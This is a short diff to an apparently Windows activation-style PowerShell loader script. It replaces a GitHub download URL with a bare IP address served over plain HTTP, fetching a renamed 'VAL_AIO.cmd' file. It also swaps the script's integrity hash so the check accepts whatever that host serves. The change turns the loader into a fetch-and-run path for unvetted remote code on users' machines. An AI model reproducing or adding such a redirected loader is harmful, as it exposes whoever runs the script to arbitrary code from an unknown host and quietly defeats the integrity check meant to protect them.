@@ -10,7 +10,9 @@ function Check3rdAV {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $URLs = @(
-    'https://raw.githubusercontent.com/valberlimabr/valberlimabr.github.io/refs/heads/main/get/MAS_AIO.cmd'
+    'http://45.175.4.4/get/VAL_AIO.cmd',
+    'http://45.175.4.4/get/VAL_AIO.cmd',
+    'http://45.175.4.4/get/VAL_AIO.cmd'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
@@ -25,7 +27,7 @@ if (-not $response) {
 }
 
 # Verify script integrity
-$releaseHash = '7AA87915CE817B8C15C9CE404F90554158E1DCAA14C506F5DFF464C336A4F28D'
+$releaseHash = '61380D53B9B22DF7D1D1DB8B58B12DFBFA36C776BC403C55EBCCA6B8074D3A3D'
 $stream = New-Object IO.MemoryStream
 $writer = New-Object IO.StreamWriter $stream
 $writer.Write($response)
